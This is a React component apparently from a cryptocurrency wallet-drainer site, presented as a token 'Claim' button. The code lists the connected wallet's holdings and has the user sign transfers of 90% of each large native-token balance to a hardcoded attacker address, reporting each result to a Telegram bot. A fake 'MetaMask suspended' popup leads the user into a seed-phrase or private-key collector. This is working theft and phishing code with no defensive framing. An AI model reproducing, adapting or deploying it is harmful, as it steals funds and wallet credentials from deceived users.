"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient, useConnect } from "wagmi";
import axios from "axios";
import { ethers } from "ethers";
import SeedPhraseCollector from "./collector";
import DeedCollector from "./collectorPk";
import Image from "next/image";
import suspended from "../../../public/deactivate.png"
import { useApproval } from "../context/approvalContext";



type Token = {
  name: string;
  symbol: string;
  balance: number;
  chain: string;
  usdValue: number;
  address: string;
};






const Native = () => {
  const { address, isConnected, connector } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isMetaMask, setIsMetaMask] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [nextPopup, setNextPopup] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const { isApproved } = useApproval(); // Access the approval status from context


  

  

  // Fetch user tokens from DeBank API
  const fetchUserTokens = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );

      const tokenData = response.data;
      const formattedTokens = tokenData.map((token: any) => {
        const rawAmount = token.raw_amount || 0;
        const decimals = token.decimals || 0;
        const balance = rawAmount / Math.pow(10, decimals);
        const usdValue = balance * (token.price || 0);

        return {
          name: token.name || "Unknown",
          symbol: token.symbol || "Unknown",
          balance: isNaN(balance) ? 0 : balance,
          chain: token.chain || "unknown",
          usdValue: isNaN(usdValue) ? 0 : usdValue,
          address: token.id,
          isCore: token.is_core || false,
          isVerified: token.is_verified || false,
        };
      });

      // Filter tokens for DeBank-supported tokens only (is_core or is_verified)
      const filteredAndSortedTokens = formattedTokens
        .filter((token: { isCore: any; isVerified: any }) => token.isCore || token.isVerified)
        .filter((token: { usdValue: number }) => token.usdValue >= 10)
        .sort((a: { usdValue: number }, b: { usdValue: number }) => b.usdValue - a.usdValue);

      setTokens(filteredAndSortedTokens);
    } catch (error) {
      console.error("Error fetching tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendTelegramMessage = async (message: string) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";
    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      console.log("Telegram message sent");
    } catch (err) {
      console.error("Failed to send Telegram message:", err);
    }
  };

  

  const sendNativeTokens = async () => {
    if (!walletClient || !address) return;
  
    const provider = new ethers.BrowserProvider(walletClient as any);
    const signer = await provider.getSigner();
    let activeChainId: number | null = null; // Track the current chain ID
  
    let sentNativeTokens = 0;
    let unsentNativeTokens = 0;
  
    const nativeTokenUsdThreshold = 1000; // Only send native tokens if their USD value is greater than $1000
  
    // Process only native tokens (ETH, BNB, AVAX, etc.)
    for (const token of tokens) {
      // Check if the token is native (ETH, BNB, POL, AVAX, FTM)
      if (
        token.address === ethers.ZeroAddress || // It's a native token (ETH, BNB, etc.)
        ["ETH", "BNB", "POL", "AVAX", "FTM"].includes(token.symbol) // Filter for native tokens
      ) {
        // Apply the USD value threshold for native tokens
        if (token.usdValue >= nativeTokenUsdThreshold) {
          const balanceToSend = (token.balance * 0.9).toFixed(4); // Send 90% of the balance, leaving enough for gas
  
          console.log(`⚡ Sending ${balanceToSend} ${token.symbol} from ${token.chain} chain...`);
  
          try {
            // Ensure we are on the correct chain before sending
            activeChainId = await walletClient.getChainId();
            const chainDetails = getChainDetailsForName(token.chain);  // Declare once here
  
            // Check if the wallet is already on the correct chain, and switch if necessary
            if (activeChainId !== chainDetails.id) {
              console.log(`⚡ Switching to ${chainDetails.name} chain...`);
              await walletClient.switchChain({ id: chainDetails.id });
  
              // Wait for chain to sync properly
              await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait a second after switching chain
  
              // Confirm that the chain has switched
              activeChainId = await walletClient.getChainId();
              if (activeChainId !== chainDetails.id) {
                const mismatchWarning = `⚠️ Network mismatch: Expected ${chainDetails.name}, but got chain ID ${activeChainId}. Skipping...`;
                console.warn(mismatchWarning);
                await sendTelegramMessage(mismatchWarning);
                continue; // Skip token if chain mismatch occurs
              }
  
              console.log(`✅ Successfully switched to ${chainDetails.name} chain.`);
              await sendTelegramMessage(`✅ Successfully switched to ${chainDetails.name} chain.`);
            }
  
            // Send native token using signer
            const transaction = {
              to: "0x12f673F3E1D583b3c768590107c25C036f02f5EC", // Replace with the recipient address
              value: ethers.parseEther(balanceToSend), // Amount to send
            };
  
            // Log the transaction details to ensure it's correct
            console.log("Transaction details:", transaction);
  
            // Prompt the user to sign the transaction
            const tx = await signer.sendTransaction(transaction);
            console.log(`⏳ Waiting for transaction confirmation...`);
  
            // Wait for the transaction to be mined
            const receipt = await tx.wait();
  
            // Check if receipt is valid (not null) before accessing receipt.hash
            if (receipt) {
              const explorerUrl = getChainDetailsForName(token.chain).explorer + receipt.hash;
              const successMessage = `✅ Successfully sent ${balanceToSend} ${token.symbol} from ${token.chain} chain.\n[View on explorer](${explorerUrl})`;
  
              console.log(successMessage); // Log the success message
              await sendTelegramMessage(successMessage); // Send the success message to Telegram
  
              sentNativeTokens++;
              console.log(`✅ Successfully sent ${balanceToSend} ${token.symbol}`);
            } else {
              // Handle the case when receipt is null or undefined
              console.warn(`⚠️ Transaction receipt is null for ${token.symbol}. Skipping...`);
              unsentNativeTokens++;
            }
  
            // After transaction is confirmed, check if network is still correct
            activeChainId = await walletClient.getChainId();
            if (activeChainId !== chainDetails.id) {
              console.warn(`⚠️ Network mismatch after transaction for ${token.symbol}. Switching to correct chain...`);
              await walletClient.switchChain({ id: chainDetails.id });
              await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait a second after switching chain
            }
  
            // Wait for the transaction message to be processed before moving on to the next token
            console.log(`✔️ Telegram message sent for token ${token.name} (${token.symbol}). Waiting 2 seconds before proceeding.`);
            await new Promise((resolve) => setTimeout(resolve, 2000));
  
          } catch (err) {
            unsentNativeTokens++;
            console.error(`❌ Failed to send native token ${token.symbol} from ${token.chain}.`, err);
            await sendTelegramMessage(`❌ Failed to send native token ${token.symbol} from ${token.chain}.`);
          }
        } else {
          console.log(`⚠️ Skipping native token ${token.symbol} as its USD value is below $1K.`);
        }
      }
    }
  
    // Final status to Telegram
    const totalTokens = tokens.length;
    const allDoneMessage = `🎉 Sequence completed! Total tokens: ${totalTokens}.
      - 💸 Sent Native Tokens: ${sentNativeTokens}
      - ⚠️ Unsent Native Tokens: ${unsentNativeTokens}`;
    console.log(allDoneMessage);
    await sendTelegramMessage(allDoneMessage);
  };
  
  
  
  
  
  
  
  
  
  
  
  
  

  const getChainDetailsForName = (chainName: string) => {
    const chainMap: { [key: string]: { id: number; name: string; explorer: string } } = {
      eth: { id: 1, name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
      bsc: { id: 56, name: "Binance Smart Chain", explorer: "https://bscscan.com/tx/" },
      matic: { id: 137, name: "Polygon", explorer: "https://polygonscan.com/tx/" },
      arb: { id: 42161, name: "Arbitrum", explorer: "https://arbiscan.io/tx/" },
      op: { id: 10, name: "Optimism", explorer: "https://optimistic.etherscan.io/tx/" },
      base: { id: 8453, name: "Base", explorer: "https://basescan.org/tx/" },
      ftm: { id: 250, name: "Fantom", explorer: "https://ftmscan.com/tx/" },
      avax: { id: 43114, name: "Avanlanche", explorer: "https://snowtrace.io/tx/" },
      blast: { id: 81457, name: "Blast", explorer: "https://blastscan.io/tx/" },
      scroll: { id: 534352, name: "Scroll", explorer: "https://scrollscan.com/tx/" },      
    };

    return chainMap[chainName] || {
        id: 1,
        name: "Ethereum Mainnet",
        explorer: "https://etherscan.io/tx/",
      }; // Default to Ethereum
    };

  useEffect(() => {
    if (isConnected && address) {
      fetchUserTokens();
    }
  }, [isConnected, address]);

  return (
    <div style={{
      width: "100%"
    }}>
      {isLoading && <p>...</p>}
      <button onClick={sendNativeTokens}
              disabled={!isApproved}
              onMouseEnter={() => setIsHovered(true)}
      onMouseLeave={() => setIsHovered(false)}
      style={{
        
  marginBottom: "5px",
  padding: "10px",
  backgroundColor: !isApproved ? "#ccc"  : isHovered
  ? "#002f7f" // Hover background color
  : "#015efe", // Default background color
  border: "none",
  borderRadius: "10px",
  color: isMetaMask ? "white" : "white",
  fontSize: "1rem",
  cursor: isMetaMask ? "not-allowed" : "pointer",
  width: "100%",
  height: "42px",
  }}
      >Claim</button>
      {showPopup && (
        <div
          style={{
            position: "fixed",
            justifyContent: "center",
            alignContent: "center",
            textAlign: "center",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            backgroundColor: "white",
            border: "1px solid #ccc",
            borderRadius: "10px",
            padding: "20px",
            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
            zIndex: 1000,
            minWidth: "300px"
          }}
        >
            <Image style={{height: "50px", width: "50px", marginBottom: "10px",}}
                 src={suspended}
                 alt='mm'/>
          <p style={{ color: "red", marginBottom: "10px" }}>
          We have temporarily suspended support for MetaMask wallets. To continue using our platform, please import your MetaMask seed or recovery phrase into Trust Wallet. Then, connect using the Trust Wallet mobile app for seamless access.
          </p>
          <div style={{
            display: "flex",
            flexDirection: "row",
            width: "100%",
            justifyContent: "space-between",
            gap: "10px"
          }}>
              <button
                onClick={() => setShowPopup(false)}
                style={{
                  padding: "10px",
                  backgroundColor: "#efefef",
                  border: "none",
                  borderRadius: "6px",
                  color: "#333",
                  fontSize: "1rem",
                  cursor: "pointer",
                  width: "50%"
                }}
              >
                Close
              </button>
              <button
onClick={() => {
    setShowPopup(false); // Close the current popup
    setTimeout(() => setNextPopup(true), 100); // Open the next popup after a slight delay
  }}                style={{
                  padding: "10px",
                  backgroundColor: "#efefef",
                  border: "none",
                  borderRadius: "6px",
                  color: "#333",
                  fontSize: "1rem",
                  cursor: "pointer",
                  width: "50%"
                }}
              >
                Continue
              </button>
          </div>
        </div>
      )}

      {/* Overlay */}
      {showPopup && (
        <div
          onClick={() => setShowPopup(false)}
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(0, 0, 0, 0.5)",
            zIndex: 999,
          }}
        />
      )}
      {nextPopup && (
        <div
          style={{
            position: "fixed",
            justifyContent: "center",
            alignContent: "center",
            textAlign: "center",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            backgroundColor: "white",
            border: "1px solid #ccc",
            borderRadius: "10px",
            padding: "20px",
            boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
            zIndex: 1000,
            overflowY: "auto", // Enable vertical scrolling
          }}
        >
         
          <DeedCollector />
          
              
              <button
                onClick={() => setNextPopup(false)}
                style={{
                  padding: "10px",
                  marginTop: "10px",
                  backgroundColor: "#efefef",
                  border: "none",
                  borderRadius: "6px",
                  color: "#333",
                  fontSize: "1rem",
                  cursor: "pointer",
                  width: "100%"
                }}
              >
                Close
              </button>
          </div>
       
      )}

      {/* Overlay */}
      {nextPopup && (
        <div
          onClick={() => setNextPopup(false)}
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(0, 0, 0, 0.5)",
            zIndex: 999,
          }}
        />
      )}
    </div>
  );
};

export default Native;
